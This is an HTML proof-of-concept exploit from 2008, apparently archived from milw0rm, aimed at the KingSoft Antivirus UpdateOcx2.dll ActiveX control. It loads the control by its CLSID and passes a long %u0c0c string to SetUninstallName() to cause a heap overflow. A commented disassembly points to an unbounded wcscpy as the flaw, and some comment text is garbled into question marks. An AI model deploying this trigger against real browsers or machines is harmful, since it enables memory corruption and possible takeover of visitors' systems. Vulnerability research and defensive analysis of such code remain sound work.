<!--
KingSoft UpdateOcx2.dll SetUninstallName() Heap Overflow Exploit

Date: 2008-02-29
MSN: void[at]ph4nt0m[dot]org
http://www.ph4nt0m.org

????: C:\WINDOWS\system32\KingSoft\KOS\UpdateOcx2.dll
????: Kingsoft Antivirus Online Update Module
????: 2007,12,29,29
-->

<object classid='clsid:D82303B7-A754-4DCB-8AFC-8CF99435AACE' id='target1'></object>
<object classid='clsid:D82303B7-A754-4DCB-8AFC-8CF99435AACE' id='target2'></object>
<script>
var str1 = "";
while (str1.length < 914)
{ str1 += unescape("%u0c0c");
}
target1.SetUninstallName(str1);
</script>

<!--
.text:1000737B ; DWORD __stdcall SetUninstallName(LPVOID this_ptr, LPVOID bsUninstallName)
.text:1000737B SetUninstallName proc near              ; DATA XREF: .rdata:1003186C o
.text:1000737B                                         ; .rdata:10031A64 o
.text:1000737B
.text:1000737B this_ptr        = dword ptr 4
.text:1000737B bsUninstallName = dword ptr 8
.text:1000737B
.text:1000737B                 mov     eax, [esp+this_ptr]
.text:1000737F                 push    [esp+bsUninstallName]
.text:10007383                 add     eax, 20h
.text:10007386                 mov     ecx, [eax]
.text:10007388                 push    eax
.text:10007389                 call    dword ptr [ecx+20h] ; ???? 10012278
.text:1000738C                 xor     eax, eax
.text:1000738E                 retn    8
.text:1000738E SetUninstallName endp


.text:10012278 ; =============== S U B R O U T I N E =======================================
.text:10012278
.text:10012278
.text:10012278 ; int __stdcall Vul_Func(int, wchar_t *Source)
.text:10012278 Vul_Func        proc near               ; DATA XREF: .rdata:10032D3C o
.text:10012278
.text:10012278 arg_0           = dword ptr 4
.text:10012278 Source          = dword ptr 8
.text:10012278
.text:10012278                 cmp     [esp+Source], 0
.text:1001227D                 jz      short loc_10012294
.text:1001227F                 mov     eax, [esp+arg_0]
.text:10012283                 push    [esp+Source]    ; Source
.text:10012287                 add     eax, 0D70h
.text:1001228C                 push    eax             ; Dest
.text:1001228D                 call    _wcscpy         ; ????????????,??heap overlfow
.text:10012292                 pop     ecx
.text:10012293                 pop     ecx
.text:10012294
.text:10012294 loc_10012294:                           ; CODE XREF: Vul_Func+5 j
.text:10012294                 xor     eax, eax
.text:10012296                 retn    8
.text:10012296 Vul_Func        endp
.text:10012296
-->

# milw0rm.com [2008-03-10]